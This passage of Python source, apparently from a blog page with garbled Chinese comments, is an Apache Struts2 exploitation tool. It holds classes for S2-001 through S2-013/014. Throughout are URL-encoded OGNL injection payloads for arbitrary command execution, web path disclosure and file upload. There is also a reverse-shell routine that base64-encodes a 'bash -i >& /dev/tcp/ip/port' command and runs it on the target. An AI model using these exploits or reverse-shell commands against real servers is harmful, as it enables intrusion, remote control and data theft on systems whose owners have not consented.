self.exec_cmd(&quot;echo &quot; + hash_str)</span><br><span class="line">    if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">        return html</span><br><span class="line">    elif hash_str in html:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def reverse_shell(self, ip, port):</span><br><span class="line">    &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">    cmd = &quot;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125;/&#123;port&#125; 0&gt;&amp;1&quot;.format(ip=ip, port=port)</span><br><span class="line">    cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    shell = self.shell.replace(&#x27;SHELL&#x27;, cmd)</span><br><span class="line">    html = self.exec_cmd(shell)</span><br><span class="line">    return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">    if os.path.exists(file_path):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;file&#125;æ–‡ä»¶ä¸å­˜åœ¨!&quot;.format(file=file_path), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_file(file_path, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;è¯»æ–‡ä»¶ï¼Œé»˜è®¤ä½¿ç”¨UTF-8ç¼–ç &quot;&quot;&quot;</span><br><span class="line">    if check_file(file_path):</span><br><span class="line">        with open(file_path, &#x27;r&#x27;, encoding=encoding) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        return data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_urls(file):</span><br><span class="line">    &quot;&quot;&quot;è¯»å–URLæ–‡ä»¶&quot;&quot;&quot;</span><br><span class="line">    if check_file(file):</span><br><span class="line">        with open(file, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">            urls = f.readlines()</span><br><span class="line">        urls = [url.strip() for url in urls if url and url.strip()]</span><br><span class="line">        return urls</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_int(name, t):</span><br><span class="line">    &quot;&quot;&quot;æ£€æŸ¥intå˜é‡&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        t = int(t)</span><br><span class="line">        return t</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] å‚æ•°&#123;name&#125;å¿…é¡»ä¸ºæ•´æ•°!&quot;.format(name=name), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_001:</span><br><span class="line">    &quot;&quot;&quot;S2-001æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-001:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.8; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#x27;%2F&#x27;))%2C%23response.flush()%2C%23response.close()%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-001&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.web_path)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_003:</span><br><span class="line">    &quot;&quot;&quot;S2-003æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-003:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.11.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œ&quot;</span><br><span class="line">    exec_payload = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-003&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_005:</span><br><span class="line">    &quot;&quot;&quot;S2-005æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-005:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.1.8.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ&quot;</span><br><span class="line">    web_path = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&quot;</span><br><span class="line">    exec_payload1 = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line">    exec_payload2 = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43mycmd%5C75%5C%27&#123;cmd&#125;%5C%27%27%29%28d%29%29&amp;%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&amp;%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&amp;%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&amp;%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        self.exec_payload = self.exec_payload1</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-005&#x27;</span><br><span class="line">        else:</span><br><span class="line">            self.exec_payload = self.exec_payload2</span><br><span class="line">            html = echo_check(self)</span><br><span class="line">            if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                return html</span><br><span class="line">            if html:</span><br><span class="line">                self.is_vul = True</span><br><span class="line">                return &#x27;S2-005&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_007:</span><br><span class="line">    &quot;&quot;&quot;S2-007æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-007:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.2.3; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;&#x27;%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))%20%2B%20&#x27;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-007&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_008:</span><br><span class="line">    &quot;&quot;&quot;S2-008æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-008:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29)&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-008&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_009:</span><br><span class="line">    &quot;&quot;&quot;S2-009æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-009:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.1.1; GETè¯·æ±‚å‘é€æ•°æ®,URLåé¢éœ€è¦è¯·æ±‚å‚æ•°å; é»˜è®¤ä¸º: key; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27&#123;cmd&#125;%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(&#123;key&#125;)(%27meh%27)]&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;key&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data.split(&#x27;=&#x27;)[0].strip()</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-009&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), key=self.data)</span><br><span class="line">        html = get(self.url + &quot;&amp;&#123;key&#125;=&#123;payload&#125;&quot;.format(key=self.data, payload=payload), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_012:</span><br><span class="line">    &quot;&quot;&quot;S2-012æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-012:å½±å“ç‰ˆæœ¬Struts Showcase App 2.0.0-2.3.13; GETè¯·æ±‚å‘é€æ•°æ®,å‚æ•°ç›´æ¥æ·»åŠ åˆ°URLåé¢; é»˜è®¤ä¸º:name; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-012&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_013:</span><br><span class="line">    &quot;&quot;&quot;S2-013/S2-014æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-013/S2-014:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D&quot;</span><br><span class="line">    upload_paylaod = &quot;$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return 